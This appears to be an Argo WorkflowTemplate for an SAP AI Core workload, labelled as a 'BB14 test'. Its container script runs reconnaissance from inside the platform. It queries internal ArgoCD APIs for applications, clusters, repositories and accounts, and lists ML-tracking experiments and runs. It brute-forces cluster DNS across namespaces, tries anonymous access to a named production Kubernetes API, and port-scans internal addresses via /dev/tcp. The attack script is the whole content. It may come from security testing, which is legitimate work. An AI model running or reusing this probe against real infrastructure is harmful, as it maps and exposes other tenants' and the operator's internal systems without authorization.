apiVersion: argoproj.io/v1alpha1
kind: WorkflowTemplate
metadata:
  name: bb14-exec
  annotations:
    scenarios.ai.sap.com/description: "BB14 test workflow"
    scenarios.ai.sap.com/name: "bb14-scenario"
    executables.ai.sap.com/description: "BB14 test executable"
    executables.ai.sap.com/name: "bb14-exec"
  labels:
    scenarios.ai.sap.com/id: "bb14-scenario"
    executables.ai.sap.com/id: "bb14-exec"
    ai.sap.com/version: "16.0.0"
spec:
  entrypoint: main
  templates:
  - name: main
    metadata:
      labels:
        ai.sap.com/resourcePlan: starter
    container:
      image: nicolaka/netshoot:latest
      command:
      - bash
      - -c
      - |
        echo "=== V16 INTERNAL SERVICES PROBE ==="
        
        # === ARGOCD SERVER ===
        echo "=== ARGOCD SERVER (100.107.174.75) ==="
        
        echo "--- ArgoCD API version ---"
        curl -sk --connect-timeout 5 "https://100.107.174.75/api/version" 2>&1 | head -c 500
        echo ""
        
        echo "--- ArgoCD settings ---"
        curl -sk --connect-timeout 5 "https://100.107.174.75/api/v1/settings" 2>&1 | head -c 1000
        echo ""
        
        echo "--- ArgoCD applications ---"
        curl -sk --connect-timeout 5 "https://100.107.174.75/api/v1/applications" 2>&1 | head -c 3000
        echo ""
        
        echo "--- ArgoCD clusters ---"
        curl -sk --connect-timeout 5 "https://100.107.174.75/api/v1/clusters" 2>&1 | head -c 2000
        echo ""
        
        echo "--- ArgoCD repositories ---"
        curl -sk --connect-timeout 5 "https://100.107.174.75/api/v1/repositories" 2>&1 | head -c 2000
        echo ""
        
        echo "--- ArgoCD projects ---"
        curl -sk --connect-timeout 5 "https://100.107.174.75/api/v1/projects" 2>&1 | head -c 2000
        echo ""
        
        echo "--- ArgoCD accounts ---"
        curl -sk --connect-timeout 5 "https://100.107.174.75/api/v1/account" 2>&1 | head -c 500
        echo ""
        
        echo "--- ArgoCD session info ---"
        curl -sk --connect-timeout 5 "https://100.107.174.75/api/v1/session/userinfo" 2>&1 | head -c 500
        echo ""
        
        # === ARGOCD REPO SERVER ===
        echo "=== ARGOCD REPO SERVER (100.107.39.134) ==="
        
        echo "--- HTTP probe ---"
        curl -sk --connect-timeout 5 "https://100.107.39.134:8081/" 2>&1 | head -c 500
        echo ""
        curl -sk --connect-timeout 5 "http://100.107.39.134:8081/" 2>&1 | head -c 500
        echo ""
        
        # gRPC probe
        which grpcurl >/dev/null 2>&1 && {
          echo "--- gRPC services ---"
          grpcurl -plaintext -connect-timeout 5 100.107.39.134:8081 list 2>&1 | head -c 1000
          echo ""
        }
        
        # === ML TRACKING SERVICE ===
        echo "=== ML TRACKING SERVICE ==="
        
        echo "--- Health ---"
        curl -s --connect-timeout 5 "http://ml-tracking-service.ml-tracking.svc.cluster.local/health" 2>&1 | head -c 500
        echo ""
        
        echo "--- Root ---"
        curl -s --connect-timeout 5 "http://ml-tracking-service.ml-tracking.svc.cluster.local/" 2>&1 | head -c 500
        echo ""
        
        echo "--- API info ---"
        curl -s --connect-timeout 5 "http://ml-tracking-service.ml-tracking.svc.cluster.local/api/v1/info" 2>&1 | head -c 500
        echo ""
        
        echo "--- Metrics (all executions) ---"
        curl -s --connect-timeout 5 "http://ml-tracking-service.ml-tracking.svc.cluster.local/api/v1/metrics" 2>&1 | head -c 3000
        echo ""
        
        echo "--- Experiments ---"
        curl -s --connect-timeout 5 "http://ml-tracking-service.ml-tracking.svc.cluster.local/api/v1/experiments" 2>&1 | head -c 2000
        echo ""
        
        echo "--- Runs ---"
        curl -s --connect-timeout 5 "http://ml-tracking-service.ml-tracking.svc.cluster.local/api/v1/runs" 2>&1 | head -c 2000
        echo ""
        
        # === DNS ENUMERATION ===
        echo "=== DNS ENUM ==="
        for ns in ml-tracking argocd argo kube-system monitoring istio-system default cert-manager; do
          echo "NS: $ns"
          dig +short "*.${ns}.svc.cluster.local" 2>/dev/null | head -5
          # Try common service names
          for svc in prometheus grafana loki kube-state-metrics alertmanager istio-pilot coredns etcd; do
            IP=$(dig +short "${svc}.${ns}.svc.cluster.local" 2>/dev/null | head -1)
            [ -n "$IP" ] && echo "  FOUND: ${svc}.${ns} = $IP"
          done
        done
        
        # === KUBERNETES API WITHOUT TOKEN ===
        echo "=== K8S API (no auth) ==="
        K8S="https://api.sec-eu10.mlfprod.internal.live.k8s.ondemand.com"
        curl -sk --connect-timeout 5 "$K8S/api" 2>&1 | head -c 500
        echo ""
        curl -sk --connect-timeout 5 "$K8S/version" 2>&1 | head -c 500
        echo ""
        curl -sk --connect-timeout 5 "$K8S/healthz" 2>&1 | head -c 500
        echo ""
        
        # Try anonymous access
        curl -sk --connect-timeout 5 "$K8S/api/v1/namespaces" 2>&1 | head -c 500
        echo ""
        
        # === NETWORK SCAN: find more services ===
        echo "=== QUICK PORT SCAN ==="
        for ip in 100.107.174.75 100.107.39.134 100.104.0.1 100.104.0.10; do
          echo "IP: $ip"
          for port in 80 443 8080 8443 9090 3000 6379 2379 9093 15010 15014 8081; do
            timeout 2 bash -c "echo >/dev/tcp/$ip/$port" 2>/dev/null && echo "  OPEN: $ip:$port"
          done
        done
        
        echo "=== V16 COMPLETE ==="
